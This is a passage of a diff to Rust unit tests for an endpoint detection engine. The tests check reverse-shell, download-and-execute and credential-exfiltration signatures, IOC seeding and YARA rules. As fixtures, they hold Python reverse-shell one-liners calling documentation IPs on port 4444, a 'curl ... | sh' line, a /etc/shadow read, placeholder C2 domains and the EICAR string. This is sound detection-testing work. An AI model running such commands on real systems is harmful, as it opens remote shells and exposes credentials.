             "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.7\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(hit.matched_signatures.is_empty(), "{command}");
@@ -1571,6 +1162,7 @@ rule eguard_custom_dir_test {
             "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(hit.matched_signatures.iter().any(|name| name == "python_socket_stdio_reverse_shell"), "{command}");
@@ -1585,6 +1177,7 @@ rule eguard_custom_dir_test {
             "python3 -c \"exec(__import__('base64').b64decode(payload))\"",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(
@@ -1673,10 +1266,7 @@ rule eguard_custom_dir_test {
                     "killchain_reverse_shell",
                 );
             }
-            assert_eq!(
-                total, instances as usize,
-                "distinct interpreter groups retain one finding per instance"
-            );
+            assert_eq!(total, 0, "routine health checks are not reverse shells");
         }
         // Group 4: an account lookup is not secret access.
         let mut engine = detp1_engine("198.51.100.20:50053");
@@ -1726,11 +1316,13 @@ rule eguard_custom_dir_test {
             let mut events = detp1_fixture_reverse("python3", 4000, peer, port);
             events[1].command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
             assert_eq!(
-                detp1_replay_count(&mut engine, &events, "killchain_reverse_shell"),
+                detp1_replay_count(&mut engine, &events, "phi_reverse_shell"),
                 1
             );
         }
         let mut engine = detp1_engine("198.51.100.20:50053");
+        read.process = "curl".into();
+        network.process = "curl".into();
         read.file_path = Some("/etc/shadow".into());
         assert_eq!(
             detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
@@ -1748,10 +1340,11 @@ rule eguard_custom_dir_test {
             let mut downloader =
                 detp1_fixture_event(pid, 10, 1, EventClass::ProcessExec, "curl", "qemu-ga");
             downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
-            let shell =
+            let mut shell =
                 detp1_fixture_event(pid + 1, 10, 2, EventClass::ProcessExec, "sh", "qemu-ga");
+            shell.command_line = Some("sh".into());
             assert_eq!(
-                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_pipe_shell"),
                 1
             );
         }
@@ -1760,10 +1353,122 @@ rule eguard_custom_dir_test {
         let mut downloader =
             detp1_fixture_event(7000, 10, 1, EventClass::ProcessExec, "curl", "service");
         downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
-        let shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
+        let mut shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
+        shell.command_line = Some("sh".into());
         assert_eq!(
-            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_pipe_shell"),
             1
         );
+    }
+    #[test]
+    fn rafix_bootstrap_has_no_placeholder_iocs_or_marker_yara() {
+        let base = unique_temp_dir("rafix-clean-seeds");
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+            control_plane_peers: Vec::new(),
+        };
+        std::fs::create_dir_all(&base).unwrap();
+        let mut engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        assert_eq!(engine.layer1.check_hash("deadbeef"), Layer1Result::Clean);
+        for domain in [
+            "known-c2.example.com",
+            "x.evil-c2-domain.example.com",
+            "malware-callback.example.net",
+        ] {
+            assert_eq!(engine.layer1.check_domain(domain), Layer1Result::Clean);
+        }
+        for ip in ["192.0.2.1", "203.0.113.10", "198.51.100.10"] {
+            assert_eq!(engine.layer1.check_ip(ip), Layer1Result::Clean);
+        }
+        assert_eq!(
+            engine
+                .layer1
+                .check_hash("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"),
+            Layer1Result::ExactMatch
+        );
+        let sample = base.join("README.txt");
+        std::fs::write(
+            &sample,
+            "eguard-malware-test-marker eguard-shellcode-marker",
+        )
+        .unwrap();
+        let mut e = base_event();
+        e.event_class = EventClass::FileOpen;
+        e.file_path = Some(sample.to_string_lossy().into());
+        assert!(engine.process_event(&e).yara_hits.is_empty());
+        std::fs::remove_dir_all(base).unwrap();
+    }
+
+    #[test]
+    fn rafix_bootstrap_uses_the_canonical_safe_template_list() {
+        let base = unique_temp_dir("rafix-templates");
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+            control_plane_peers: Vec::new(),
+        };
+        let engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        assert_eq!(
+            engine.layer4.template_names(),
+            detection::Layer4Engine::with_default_templates().template_names()
+        );
+        assert_eq!(
+            engine.layer4.template_names(),
+            vec![
+                "killchain_container_escape",
+                "killchain_exploit_ptrace_fileless",
+                "killchain_exploit_proc_mem_fileless"
+            ]
+        );
+    }
+    #[test]
+    fn rafix_bootstrap_yara_has_no_markers_or_duplicate_eicar_prefix() {
+        let base = unique_temp_dir("rafix-yara-seeds");
+        std::fs::create_dir_all(&base).unwrap();
+        let mut engine = detection::DetectionEngine::default_with_rules();
+        super::seed_yara_rules(&mut engine, &base.join("yara"));
+        let sample = base.join("sample.bin");
+        std::fs::write(
+            &sample,
+            "eguard-malware-test-marker eguard-shellcode-marker",
+        )
+        .unwrap();
+        let mut e = base_event();
+        e.event_class = EventClass::FileOpen;
+        e.file_path = Some(sample.to_string_lossy().into());
+        assert!(
+            engine.yara.scan_event(&e).is_empty(),
+            "raw backend must not load bootstrap canaries"
+        );
+        engine
+            .load_yara_rules_str(
+                r#"
+rule eguard_eicar_test {
+  strings:
+    $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+  condition:
+    $eicar at 0 and filesize <= 128
+}
+"#,
+            )
+            .unwrap();
+        std::fs::write(
+            &sample,
+            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
+        )
+        .unwrap();
+        let hits = engine.yara.scan_event(&e);
+        assert_eq!(
+            hits.len(),
+            1,
+            "EICAR must not also match a bootstrap prefix rule: {hits:?}"
+        );
+        assert_eq!(hits[0].rule_name, "eguard_eicar_test");
+        std::fs::remove_dir_all(base).unwrap();
     }
 }
